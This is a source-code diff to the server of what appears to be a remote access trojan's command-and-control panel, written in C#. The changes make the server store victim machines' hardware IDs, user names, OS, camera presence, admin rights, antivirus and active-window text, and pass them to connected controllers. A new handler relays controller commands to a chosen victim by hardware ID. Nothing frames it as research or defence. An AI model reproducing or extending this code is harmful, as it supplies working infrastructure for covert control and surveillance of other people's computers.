@@ -32,6 +32,9 @@ namespace Server
                                 Console.WriteLine("Login from " + client.Info.IP);
                                 Settings.Controler.Add(client);
                                 client.Controler = true;
+                                client.Info.LastPing = DateTime.Now;
+                                client.Info.HWID = unpack_msgpack.ForcePathObject("HWID").AsString;
+
                                 if (Settings.Online.Count > 0)
                                 {
                                     foreach (Clients clients in Settings.Online)
@@ -42,29 +45,38 @@ namespace Server
                                         msgpack.ForcePathObject("HWID").AsString = clients.Info.HWID;
                                         msgpack.ForcePathObject("User").AsString = clients.Info.User;
                                         msgpack.ForcePathObject("OS").AsString = clients.Info.OS;
-                                        msgpack.ForcePathObject("Camera").SetAsBoolean(clients.Info.Camera);
+                                        msgpack.ForcePathObject("Camera").AsString = clients.Info.Camera;
                                         msgpack.ForcePathObject("Path").AsString = clients.Info.Path;
                                         msgpack.ForcePathObject("Version").AsString = clients.Info.Version;
                                         msgpack.ForcePathObject("Admin").AsString = clients.Info.Permission;
-                                        msgpack.ForcePathObject("Active").AsString = clients.Info.Active; 
+                                        msgpack.ForcePathObject("Active").AsString = clients.Info.Active;
                                         msgpack.ForcePathObject("AV").AsString = clients.Info.AV;
-                                        msgpack.ForcePathObject("Install-Type").AsInteger = clients.Info.InstallType;
+                                        msgpack.ForcePathObject("Install-Type").AsString = clients.Info.InstallType;
                                         msgpack.ForcePathObject("Install-Time").AsString = clients.Info.InstallTime;
                                         msgpack.ForcePathObject("Group").AsString = clients.Info.Group;
-                                        ThreadPool.QueueUserWorkItem(client.BeginSend, unpack_msgpack.Encode2Bytes());
+                                        foreach (Clients CL in Settings.Controler.ToList())
+                                        {
+                                            ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
+                                        }
+
                                     }
                                 }
                             }
                             break;
                         case "Ping":
                             {
-                                Console.WriteLine("Ping from controler " + client.Info.IP);
-                                client.LastPing = DateTime.Now;
+                                client.Info.LastPing = DateTime.Now;
                             }
                             break;
                         case "Command": 
                             {
-
+                                foreach (Clients CL in Settings.Online.ToList())
+                                {
+                                    if (CL.Info.HWID == unpack_msgpack.ForcePathObject("HWID").AsString)
+                                    {
+                                        ThreadPool.QueueUserWorkItem(CL.BeginSend, unpack_msgpack.Encode2Bytes());
+                                    }
+                                }
                             }
                             break;
                         case "Error":
@@ -111,8 +123,8 @@ namespace Server
                                 client.Info.HWID = unpack_msgpack.ForcePathObject("HWID").AsString;
                                 client.Info.User = unpack_msgpack.ForcePathObject("User").AsString;
                                 client.Info.OS = unpack_msgpack.ForcePathObject("OS").AsString;
-                                client.Info.Camera = Convert.ToBoolean(unpack_msgpack.ForcePathObject("Camera").AsString);
-                                client.Info.InstallType = unpack_msgpack.ForcePathObject("Install-Type").GetAsInteger();
+                                client.Info.Camera = unpack_msgpack.ForcePathObject("Camera").AsString;
+                                client.Info.InstallType = unpack_msgpack.ForcePathObject("Install-Type").AsString;
                                 client.Info.InstallTime = unpack_msgpack.ForcePathObject("Install-Time").AsString;
                                 client.Info.Path = unpack_msgpack.ForcePathObject("Path").AsString;
                                 client.Info.Version = unpack_msgpack.ForcePathObject("Version").AsString;
@@ -120,7 +132,7 @@ namespace Server
                                 client.Info.AV = unpack_msgpack.ForcePathObject("AV").AsString;
                                 client.Info.Group = unpack_msgpack.ForcePathObject("Group").AsString;
                                 client.Info.Active = unpack_msgpack.ForcePathObject("Active").AsString;
-                                client.Info.LastPing = DateTime.Now; ;
+                                client.Info.LastPing = DateTime.Now;
 
                                 if (Settings.Controler.Count > 0)
                                 {
@@ -137,12 +149,14 @@ namespace Server
                             }
                             break;
 
-                        case "Ping":
+                        case "ClientPing":
                             {
-                                client.LastPing = DateTime.Now;
+                                Console.WriteLine(unpack_msgpack.ForcePathObject("Message").AsString);
+                                client.Info.LastPing = DateTime.Now;
                                 client.Info.Active = unpack_msgpack.ForcePathObject("Message").AsString;
                                 if (Settings.Controler.Count > 0)
                                 {
+                                    unpack_msgpack.ForcePathObject("HWID").AsString = client.Info.HWID;
                                     foreach (Clients clients in Settings.Controler)
                                     {
                                         ThreadPool.QueueUserWorkItem(clients.BeginSend, unpack_msgpack.Encode2Bytes());
